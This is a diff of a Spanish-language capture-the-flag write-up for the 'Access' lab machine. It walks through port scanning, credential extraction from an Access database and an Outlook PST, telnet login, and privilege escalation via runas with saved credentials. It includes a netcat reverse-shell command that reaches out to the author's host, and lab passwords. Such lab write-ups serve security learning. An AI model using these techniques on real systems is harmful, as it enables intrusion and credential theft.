@@ -29,7 +29,7 @@ Su tarjeta de presentación es:
 
 Iniciamos por ejecutar un `nmap` y un `masscan` para identificar puertos udp y tcp abiertos:
 
-```text
+``` text
 root@laptop:~# nmap -sS -p- 10.10.10.98 --open -v -n
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-03 11:54 CST
 Initiating Ping Scan at 11:54
@@ -63,7 +63,7 @@ Nmap done: 1 IP address (1 host up) scanned in 1376.09 seconds
 
 Corroboremos con `masscan`:
 
-```text
+``` text
 root@laptop:~# masscan -e tun0 -p0-65535,U:0-65535 --rate 500 10.10.10.98
 
 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2018-12-31 18:50:23 GMT
@@ -85,7 +85,7 @@ Como podemos ver los puertos son los mismos, por lo que iniciamos por identifica
 
 Lanzamos `nmap` con los parámetros habituales para la identificación (\-A):
 
-```text
+``` text
 root@laptop:~# nmap -A -T4 -p80,23,21 10.10.10.98 --open -v -n
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-03 11:12 CST
 NSE: Loaded 148 scripts for scanning.
@@ -185,7 +185,7 @@ Continué con el siguiente servicio.
 
 Para el servicio FTP que tiene acceso anónimo, decidí usar wget mirror, el cual luce de la siguiente manera:
 
-```text
+``` text
 xbytemx@laptop:~/htb/access/ftp-anon$ wget --no-passive-ftp -m ftp://anonymous:@10.10.10.98/
 --2019-01-03 11:53:53--  ftp://anonymous:*password*@10.10.10.98/
            => “10.10.10.98/.listing”
@@ -260,14 +260,14 @@ Analicemos el backup.
 
 He de confesar que no conocía este tipo de archivo y que después de googlear un poco acerca de su contenido\-formato, encontré la herramienta para explorarlo. Empecé por listar las tablas:
 
-```text
+``` text
 xbytemx@laptop:~/htb/access$ mdb-tables ftp-anon/10.10.10.98/Backups/backup.mdb
 acc_antiback acc_door acc_firstopen acc_firstopen_emp acc_holidays acc_interlock acc_levelset acc_levelset_door_group acc_linkageio acc_map acc_mapdoorpos acc_morecardempgroup acc_morecardgroup acc_timeseg acc_wiegandfmt ACGroup acholiday ACTimeZones action_log AlarmLog areaadmin att_attreport att_waitforprocessdata attcalclog attexception AuditedExc auth_group_permissions auth_message auth_permission auth_user auth_user_groups auth_user_user_permissions base_additiondata base_appoption base_basecode base_datatranslation base_operatortemplate base_personaloption base_strresource base_strtranslation base_systemoption CHECKEXACT CHECKINOUT dbbackuplog DEPARTMENTS deptadmin DeptUsedSchs devcmds devcmds_bak django_content_type django_session EmOpLog empitemdefine EXCNOTES FaceTemp iclock_dstime iclock_oplog iclock_testdata iclock_testdata_admin_area iclock_testdata_admin_dept LeaveClass LeaveClass1 Machines NUM_RUN NUM_RUN_DEIL operatecmds personnel_area personnel_cardtype personnel_empchange personnel_leavelog ReportItem SchClass SECURITYDETAILS ServerLog SHIFT TBKEY TBSMSALLOT TBSMSINFO TEMPLATE USER_OF_RUN USER_SPEDAY UserACMachines UserACPrivilege USERINFO userinfo_attarea UsersMachines UserUpdates worktable_groupmsg worktable_instantmsg worktable_msgtype worktable_usrmsg ZKAttendanceMonthStatistics acc_levelset_emp acc_morecardset ACUnlockComb AttParam auth_group AUTHDEVICE base_option dbapp_viewmodel FingerVein devlog HOLIDAYS personnel_issuecard SystemLog USER_TEMP_SCH UserUsedSClasses acc_monitor_log OfflinePermitGroups OfflinePermitUsers OfflinePermitDoors LossCard TmpPermitGroups TmpPermitUsers TmpPermitDoors ParamSet acc_reader acc_auxiliary STD_WiegandFmt CustomReport ReportField BioTemplate FaceTempEx FingerVeinEx TEMPLATEEx
 ```
 
 Ahora que soy capaz de listar las tablas, se me ocurrió buscar dentro de cada tabla la palabra **password**, para ello realice el siguiente for en bash:
 
-```text
+``` text
 xbytemx@laptop:~/htb/access$ for TABLE in $(mdb-tables ftp-anon/10.10.10.98/Backups/backup.mdb); do mdb-export ftp-anon/10.10.10.98/Backups/backup.mdb ${TABLE} | grep password && printf "La tabla es %s\n" ${TABLE}; done
 id,username,password,Status,last_login,RoleID,Remark
 La tabla es auth_user
@@ -275,7 +275,7 @@ La tabla es auth_user
 
 Hemos encontrado una tabla curiosa, `auth_user`, exportamos al *STDOUT* el contenido de la tabla.
 
-```text
+``` text
 xbytemx@laptop:~/htb/access$ mdb-export ftp-anon/10.10.10.98/Backups/backup.mdb auth_user
 id,username,password,Status,last_login,RoleID,Remark
 25,"admin","admin",1,"08/23/18 21:11:47",26,
@@ -291,7 +291,7 @@ Si recordamos hace unos momentos del mirror, teníamos una carpeta llamada Engin
 
 Efectivamente, era la contraseña del ZIP. Siempre es bueno intentar todo lo nuevo que aprendamos de la enumeración.
 
-```text
+``` text
 xbytemx@laptop:~/htb/access/ftp-anon/10.10.10.98/Engineer$ 7z x Access\ Control.zip
 
 7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
@@ -321,7 +321,7 @@ Desafortunadamente para la solución, no le estoy pasando como argumento la cont
 
 Después de descomprimir el zip, tenemos un archivo con extensión **PST**, que es comúnmente usado por Outlook/Exchange, para almacenar los correos como un archivo, similar a EML. Exploramos este archivo con `readpst`:
 
-```text
+``` text
 xbytemx@laptop:~/htb/access/ftp-anon/10.10.10.98/Engineer$ readpst Access\ Control.pst
 Opening PST file and indexes...
 Processing Folder "Deleted Items"
@@ -330,7 +330,7 @@ Processing Folder "Deleted Items"
 
 Tenemos un archivo tipo **MBOX** como salida, el cual simplemente pasamos por `strings`:
 
-```text
+``` text
 xbytemx@laptop:~/htb/access/ftp-anon/10.10.10.98/Engineer$ strings Access\ Control.mbox00000001
 From "john@megacorp.com" Thu Aug 23 18:44:07 2018
 Status: RO
@@ -364,7 +364,7 @@ Descubrimos que la password de la cuenta *security* es **4Cc3ssC0ntr0ller**.
 
 Usando estas credenciales, ingresemos por telnet:
 
-```text
+``` text
 xbytemx@laptop:~/htb/access/ftp-anon/10.10.10.98/Engineer$ telnet 10.10.10.98
 Trying 10.10.10.98...
 Connected to 10.10.10.98.
@@ -388,7 +388,7 @@ Listo, hemos obtenido la flag de user.
 
 Después de verificar algunos datos sobre la cuenta, enumerar y enumerar un rato, encontré algo curioso con cmdkey:
 
-```text
+``` text
 C:\Users\security\Desktop>cmdkey /list
 
 Currently stored credentials:
@@ -421,7 +421,7 @@ En mi caso, me complique un poco de más y realice lo siguiente:
 
 Usar las credenciales de Administrator para ejecutar un cmd.exe que remotamente ejecute un netcat que a su vez llame a un cmd. Esto significa que del lado de mi máquina levanta un smbserver y un listener de netcat.
 
-```text
+``` text
 C:\Users\security>runas /savecred /user:ACCESS\Administrator "c:\windows\system32\cmd.exe /c \\10.10.13.32\a\nc.exe -vn 10.10.13.32 3001 -e cmd.exe"
 ```
 
@@ -437,7 +437,7 @@ Ejecutando runas (la implementación en windows de sudo y doas):
 
 En el lado de mi máquina el smbserver a la escucha con parámetro `a` como el smbshare y la carpeta donde tengo netcat for win32.
 
-```text
+``` text
 root@laptop:/home/xbytemx/git/impacket/examples# python smbserver.py a /home/xbytemx/tools/netcat-win32-1.11/
 Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
 
@@ -465,7 +465,7 @@ Así es, ya tenia la hash de NTLM de Administrator, unos minutos rompiendo y con
 
 El netcat en mi máquina esperando el remote shell de cmd.exe:
 
-```text
+``` text
 xbytemx@laptop:~/htb/access$ ncat -vnlp 3001
 Ncat: Version 7.70 ( https://nmap.org/ncat )
 Ncat: Listening on :::3001
@@ -487,7 +487,7 @@ cd c:\Users\Administrator\Desktop\
 
 Simplemente obtenemos la flag:
 
-```text
+``` text
 C:\Users\Administrator\Desktop>type root.txt
 type root.txt
 ```
